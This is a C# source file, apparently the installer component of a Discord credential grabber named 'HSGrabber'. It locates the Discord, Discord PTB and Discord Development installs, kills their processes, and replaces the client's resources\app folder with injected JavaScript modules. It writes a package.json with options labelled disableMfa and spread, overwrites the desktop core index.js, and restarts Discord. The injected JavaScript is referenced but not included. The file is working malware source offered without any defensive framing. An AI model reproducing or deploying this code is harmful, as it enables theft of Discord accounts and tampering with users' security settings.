using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using HSGrabber;
using HSGrabber_Injec;
using HSGrabber_Mod;

namespace HSGrabber
{
	internal class Program
	{
		private static void Main(string[] args)
		{
			bool flag = Program.getPath(BuildType.Discord) != null;
			if (flag)
			{
				Program.Inject(Program.getPath(BuildType.Discord), BuildType.Discord);
			}
			bool flag3 = Program.getPath(BuildType.DiscordDevelopment) != null;
			if (flag3)
			{
				Program.Inject(Program.getPath(BuildType.DiscordDevelopment), BuildType.DiscordDevelopment);
			}
			bool flag4 = Program.getPath(BuildType.DiscordPTB) != null;
			if (flag4)
			{
				Program.Inject(Program.getPath(BuildType.DiscordPTB), BuildType.DiscordPTB);
			}
		}

		public static void Inject(string path, BuildType type)
		{
			try
			{
				bool flag = Directory.Exists(path + "\\app");
				if (flag)
				{
					Directory.Delete(path + "\\app", true);
				}
			}
			catch
			{
				Process[] processesByName = Process.GetProcessesByName(type.ToString());
				for (int i = 0; i < processesByName.Length; i++)
				{
					processesByName[i].Kill();
					Directory.Delete(path + "\\app", true);
				}
			}
			Directory.CreateDirectory(path + "\\app");
			File.WriteAllText(path + "\\app\\index.js", Injec.injec);
			Directory.CreateDirectory(path + "\\app\\modules");
			File.WriteAllText(path + "\\app\\modules\\index.js", Mod.mod);
			File.WriteAllText(path + "\\app\\package.json", string.Concat(new string[]
			{
				"{\"name\":\"discord\",\"main\":\"index.js\",\"loaded\":false,\"dir\":\"",
				path.Replace("\\", "\\\\"),
				"\\\\app\\\\modules\\\\index.js\",\"disabled\":",
				Settings.disableMfa.ToString().ToLower(),
				",\"private\":true,\"multiply\":",
				Settings.spread.ToString().ToLower(),
				"}"
			}));
			Program.coolMethod(type);
			bool restartDiscord = Settings.restartDiscord;
			if (restartDiscord)
			{
				switch (type)
				{
				case BuildType.Discord:
						{
							Process[] processesByName2 = Process.GetProcessesByName("Discord");
							foreach (Process process in Process.GetProcessesByName("Discord"))
							{
								try
								{
									process.Kill();
								}
								catch
								{
								}
							}
							bool flag2 = processesByName2.Length != 0;
							if (flag2)
							{
								Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk");
							}
							break;
						}
				
				case BuildType.DiscordPTB:
				{
					Process[] processesByName6 = Process.GetProcessesByName("DiscordPTB");
					foreach (Process process3 in Process.GetProcessesByName("DiscordPTB"))
					{
						try
						{
							process3.Kill();
						}
						catch
						{
						}
					}
					bool flag4 = processesByName6.Length != 0;
					if (flag4)
					{
						Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord PTB.lnk");
					}
					break;
				}
				case BuildType.DiscordDevelopment:
				{
					Process[] processesByName8 = Process.GetProcessesByName("DiscordDevelopment");
					foreach (Process process4 in Process.GetProcessesByName("DiscordDevelopment"))
					{
						try
						{
							process4.Kill();
						}
						catch
						{
						}
					}
					bool flag5 = processesByName8.Length != 0;
					if (flag5)
					{
						Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord Development.lnk");
					}
					break;
				}
				}
			}
		}

		public static string lastFound { get; set; }

		public static string lastCanaryFound { get; set; }

		public static string lastPTBFound { get; set; }

		public static string lastDevelopmentFound { get; set; }

		public static string getPath(BuildType type)
		{
			string environmentVariable = Environment.GetEnvironmentVariable("localappdata");
			string pattern = "app-\\d\\.\\d\\.\\d{2}(\\d{2}|\\d|)";
			string result;
			switch (type)
			{
			case BuildType.Discord:
					{
						string text = environmentVariable + "\\Discord";
						bool flag = !Directory.Exists(text);
						if (flag)
						{
							result = null;
						}
						else
						{
							bool flag2 = false;
							string[] directories = Directory.GetDirectories(text);
							for (int i = 0; i < directories.Length; i++)
							{
								Match match = Regex.Match(directories[i], pattern);
								bool flag3 = match.Success && flag2;
								if (flag3)
								{
									try
									{
										char value = Program.lastFound.Last<char>();
										char c = match.Value.Last<char>();
										int num = Convert.ToInt32(value);
										Convert.ToInt32(c);
										bool flag4 = (int)c > num;
										if (flag4)
										{
											Program.lastFound = match.Value;
										}
									}
									catch
									{
										break;
									}
								}
								bool success = match.Success;
								if (success)
								{
									flag2 = true;
									Program.lastFound = match.Value;
								}
							}
							result = text + "\\" + Program.lastFound + "\\resources";
						}
						break;
					}
			case BuildType.DiscordPTB:
			{
				string text3 = environmentVariable + "\\DiscordPTB";
				bool flag9 = !Directory.Exists(text3);
				if (flag9)
				{
					result = null;
				}
				else
				{
					bool flag10 = false;
					string[] directories3 = Directory.GetDirectories(text3);
					for (int k = 0; k < directories3.Length; k++)
					{
						Match match3 = Regex.Match(directories3[k], pattern);
						bool flag11 = match3.Success && flag10;
						if (flag11)
						{
							try
							{
								char value3 = Program.lastPTBFound.Last<char>();
								char c3 = match3.Value.Last<char>();
								int num3 = Convert.ToInt32(value3);
								Convert.ToInt32(c3);
								bool flag12 = (int)c3 > num3;
								if (flag12)
								{
									Program.lastPTBFound = match3.Value;
								}
							}
							catch
							{
								break;
							}
						}
						bool success3 = match3.Success;
						if (success3)
						{
							flag10 = true;
							Program.lastPTBFound = match3.Value;
						}
					}
					result = text3 + "\\" + Program.lastPTBFound + "\\resources";
				}
				break;
			}
			case BuildType.DiscordDevelopment:
			{
				string text4 = environmentVariable + "\\DiscordDevelopment";
				bool flag13 = !Directory.Exists(text4);
				if (flag13)
				{
					result = null;
				}
				else
				{
					bool flag14 = false;
					string[] directories4 = Directory.GetDirectories(text4);
					for (int l = 0; l < directories4.Length; l++)
					{
						Match match4 = Regex.Match(directories4[l], pattern);
						bool flag15 = match4.Success && flag14;
						if (flag15)
						{
							try
							{
								char value4 = Program.lastDevelopmentFound.Last<char>();
								char c4 = match4.Value.Last<char>();
								int num4 = Convert.ToInt32(value4);
								Convert.ToInt32(c4);
								bool flag16 = (int)c4 > num4;
								if (flag16)
								{
									Program.lastDevelopmentFound = match4.Value;
								}
							}
							catch
							{
								break;
							}
						}
						bool success4 = match4.Success;
						if (success4)
						{
							flag14 = true;
							Program.lastDevelopmentFound = match4.Value;
						}
					}
					result = text4 + "\\" + Program.lastDevelopmentFound + "\\resources";
				}
				break;
			}
			default:
				result = null;
				break;
			}
			return result;
		}

		private static string _path { get; set; }

		public static void coolMethod(BuildType type)
		{
			Program._path = Environment.GetEnvironmentVariable("appdata") + "\\" + type.ToString().ToLower();
			switch (type)
			{
			case BuildType.Discord:
				Program._path = Program._path + "\\" + Program.lastFound.Replace("app-", "");
				break;
			case BuildType.DiscordPTB:
				Program._path = Program._path + "\\" + Program.lastPTBFound.Replace("app-", "");
				break;
			case BuildType.DiscordDevelopment:
				Program._path = Program._path + "\\" + Program.lastDevelopmentFound.Replace("app-", "");
				break;
			}
			Program._path += "\\modules\\discord_desktop_core\\index.js";
			bool flag = File.ReadAllText(Program._path).Count<char>() > 1;
			if (flag)
			{
				File.WriteAllText(Program._path, "module.exports = require('./core.asar');");
			}
		}
	}
}
